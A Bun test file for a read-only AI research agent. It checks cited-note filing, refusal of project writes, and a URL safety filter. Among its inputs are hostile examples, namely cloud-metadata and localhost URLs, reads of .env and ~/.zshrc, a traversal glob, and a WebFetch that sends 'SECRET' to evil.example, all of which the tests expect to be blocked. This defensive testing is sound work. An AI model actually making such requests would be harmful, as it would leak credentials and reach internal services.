// Research: look things up for the project and file cited notes. It writes no code and changes nothing in the project.
import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { AgentRunner } from "../src/agent.ts";
import { ScriptedEngine, type Step } from "../src/engine.ts";
import { TaskLog } from "../src/tasklog.ts";
import { isSafeUrl, noteFileName, notesMarkdown, parseResearch, researchPrompt } from "../src/research.ts";
import type { Event } from "../../protocol/index.ts";

const made: string[] = [];
afterEach(() => { while (made.length) rmSync(made.pop()!, { recursive: true, force: true }); });
const tmp = (l: string) => { const d = realpathSync(mkdtempSync(join(tmpdir(), `companion-rr-${l}-`))); made.push(d); return d; };
const say = (text: string, costUsd = 0.01): Step => ({ text, costUsd });
const tool = (name: string, input: Record<string, unknown>): Step => ({ tool: { name, input }, costUsd: 0.01 });
const answer = (o: object = {}) => say("```json\n" + JSON.stringify({ title: "Stripe checkout options", answer: "Use Stripe Checkout for a hosted page.", notes: [{ text: "Checkout is a hosted payment page.", source: "https://docs.stripe.com/payments/checkout" }, { text: "Test cards never charge money.", source: "https://docs.stripe.com/testing" }], ...o }) + "\n```");
const of = (e: Event[], t: string) => e.filter((x) => x.type === t) as any[];

function setup(rounds: Step[][]) {
  const project = tmp("p"); writeFileSync(join(project, "index.html"), "<h1>site</h1>");
  const events: Event[] = [];
  const engine = new ScriptedEngine(rounds);
  const runner = new AgentRunner({ shadowRoot: tmp("s"), engine, log: new TaskLog(":memory:"), emit: (e) => events.push(e), now: () => new Date("2026-10-09T10:00:00Z") });
  const ask = (question = "How do I take payments?", budgetUsd = 3) => runner.handle({ v: 1, id: "q1", type: "research.ask", project, agent: "x1", question, model: "m", budgetUsd });
  return { project, events, engine, runner, ask };
}

describe("reading the research answer", () => {
  test("notes with a real web source are kept", () => {
    const r = parseResearch('{"title":"T","answer":"A","notes":[{"text":"n","source":"https://a.com/x"}]}')!;
    expect(r.notes).toEqual([{ text: "n", source: "https://a.com/x" }]);
  });
  test("a note without a usable source is dropped: only cited notes are filed", () => {
    const r = parseResearch(JSON.stringify({ title: "T", answer: "A", notes: [{ text: "no source" }, { text: "bad", source: "not a url" }, { text: "file", source: "file:///etc/passwd" }, { text: "good", source: "https://a.com" }] }))!;
    expect(r.notes.map((n) => n.text)).toEqual(["good"]);
  });
  test("no cited notes at all means nothing to file", () => expect(parseResearch(JSON.stringify({ title: "T", answer: "A", notes: [{ text: "x" }] }))).toBeNull());
  test("a missing title or answer, or broken JSON, is not guessed", () => {
    expect(parseResearch(JSON.stringify({ answer: "A", notes: [{ text: "n", source: "https://a.com" }] }))).toBeNull();
    expect(parseResearch("{nope")).toBeNull();
    expect(parseResearch("nothing")).toBeNull();
  });
  test("the same source twice with the same text is kept once", () => {
    const n = { text: "same", source: "https://a.com" };
    expect(parseResearch(JSON.stringify({ title: "T", answer: "A", notes: [n, n] }))!.notes.length).toBe(1);
  });
});

describe("which addresses it may open", () => {
  for (const ok of ["https://docs.stripe.com/x", "http://example.com", "https://a.b.co.uk/p?q=1"]) test(`${ok} is fine`, () => expect(isSafeUrl(ok)).toBe(true));
  for (const bad of ["file:///etc/passwd", "ftp://x.com", "http://localhost:3000", "http://127.0.0.1/x", "http://10.0.0.5", "http://192.168.1.1", "http://169.254.169.254/latest", "https://user:pw@example.com", "javascript:alert(1)", "not a url", "http://[::1]/"]) test(`${bad} is refused`, () => expect(isSafeUrl(bad)).toBe(false));
});

describe("the notes file", () => {
  test("a plain, safe file name from the title and date", () => {
    expect(noteFileName("Stripe checkout options!", new Date("2026-10-09T10:00:00Z"), () => false)).toBe("2026-10-09-stripe-checkout-options.md");
  });
  test("odd characters and path tricks cannot escape the folder", () => {
    const n = noteFileName("../../etc/passwd", new Date("2026-10-09T10:00:00Z"), () => false);
    expect(n).not.toContain("/"); expect(n).not.toContain("..");
    expect(noteFileName("日本語", new Date("2026-10-09T10:00:00Z"), () => false)).toMatch(/^2026-10-09-notes\.md$/);
  });
  test("an existing file is never overwritten: a number is added", () => {
    const taken = new Set(["2026-10-09-a.md"]);
    expect(noteFileName("a", new Date("2026-10-09T10:00:00Z"), (f) => taken.has(f))).toBe("2026-10-09-a-2.md");
  });
  test("each note is followed by its source, in a file a person can read and edit", () => {
    const md = notesMarkdown("How do I take payments?", { title: "Payments", answer: "Use Checkout.", notes: [{ text: "It is hosted.", source: "https://a.com/x" }] }, new Date("2026-10-09T10:00:00Z"));
    expect(md).toContain("# Payments");
    expect(md).toContain("How do I take payments?");
    expect(md).toContain("- It is hosted.");
    expect(md).toContain("Source: https://a.com/x");
    expect(md).toContain("2026-10-09");
  });
  test("the prompt demands a source for every note and no changes", () => {
    const p = researchPrompt("how to take payments");
    expect(p).toMatch(/source/i); expect(p).toMatch(/https/); expect(p).toMatch(/do not change|change nothing|read only/i); expect(p).toContain("how to take payments");
  });
});

describe("researching a question", () => {
  test("it files cited notes in the project's notes folder and says where", async () => {
    const r = setup([[answer()]]);
    await r.ask();
    const done = of(r.events, "research.done")[0];
    expect(done.title).toBe("Stripe checkout options");
    expect(done.notes.length).toBe(2);
    expect(done.file).toBe(".companion/research/2026-10-09-stripe-checkout-options.md");
    const text = readFileSync(join(r.project, done.file), "utf8");
    expect(text).toContain("Source: https://docs.stripe.com/testing");
    expect(of(r.events, "agent.state").at(-1).state).toBe("done");
  });
  test("it never changes the project: a write is refused and only the notes file appears", async () => {
    const r = setup([[tool("Write", { file_path: "code.js", content: "x" }), tool("Bash", { command: "echo hi > y.txt" }), answer()]]);
    await r.ask();
    expect(existsSync(join(r.project, "code.js"))).toBe(false);
    expect(existsSync(join(r.project, "y.txt"))).toBe(false);
    expect(of(r.events, "agent.tool").filter((t) => t.outcome === "blocked").length).toBe(2);
    expect(readdirSync(join(r.project, ".companion/research")).length).toBe(1);
    expect(readFileSync(join(r.project, "index.html"), "utf8")).toBe("<h1>site</h1>");
  });
  test("it may search and read the web, but only safe addresses", async () => {
    const r = setup([[tool("WebSearch", { query: "stripe checkout" }), tool("WebFetch", { url: "https://docs.stripe.com/payments" }), tool("WebFetch", { url: "http://169.254.169.254/latest/meta-data" }), tool("WebFetch", { url: "http://localhost:3000/admin" }), answer()]]);
    await r.ask();
    const outcomes = of(r.events, "agent.tool").map((t) => t.outcome);
    expect(outcomes).toEqual(["ran", "ran", "blocked", "blocked"]);
  });
  test("it never reads settings or key files, other folders, or sends data out in a web address (found by the 15 Oct 2026 review)", async () => {
    const r = setup([[
      tool("Read", { file_path: join(tmpdir(), "elsewhere.txt") }), tool("Read", { file_path: "~/.zshrc" }), tool("Read", { file_path: ".env" }), tool("Glob", { pattern: "../../**/.env" }),
      tool("WebFetch", { url: "https://evil.example/c?d=SECRET" }), tool("WebFetch", { url: "https://evil.example/" + "A1b2".repeat(15) }),
      tool("Read", { file_path: "index.html" }), tool("WebFetch", { url: "https://docs.stripe.com/payments" }),
    ]]);
    writeFileSync(join(r.project, ".env"), "SECRET=1");
    await r.ask();
    expect(of(r.events, "agent.tool").map((t) => t.outcome)).toEqual(["blocked", "blocked", "blocked", "blocked", "blocked", "blocked", "ran", "ran"]);
  });
  test("an answer with no cited notes is reported plainly and nothing is filed", async () => {
    const r = setup([[answer({ notes: [{ text: "no source" }] })]]);
    await r.ask();
    expect(of(r.events, "research.done").length).toBe(0);
    expect(of(r.events, "protocol.error")[0].reason).toMatch(/cited|sources/i);
    expect(existsSync(join(r.project, ".companion"))).toBe(false);
  });
  test("two researches on the same question keep both files", async () => {
    const r = setup([[answer()], [answer()]]);
    await r.ask(); await r.ask();
    expect(readdirSync(join(r.project, ".companion/research")).sort()).toEqual(["2026-10-09-stripe-checkout-options-2.md", "2026-10-09-stripe-checkout-options.md"]);
  });
  test("an empty question is refused", async () => {
    const r = setup([[answer()]]);
    await r.ask("   ");
    expect(r.engine.calls.length).toBe(0);
    expect(of(r.events, "protocol.error")[0].reason).toMatch(/question/i);
  });
  test("the stop key ends it with nothing filed", async () => {
    const r = setup([[{ text: "reading", costUsd: 0, delayMs: 3000 }, answer()]]);
    const run = r.ask();
    await Bun.sleep(300);
    await r.runner.handle({ v: 1, id: "k", type: "agent.interruptAll", reason: "kill switch" });
    await run;
    expect(of(r.events, "research.done").length).toBe(0);
  });
});
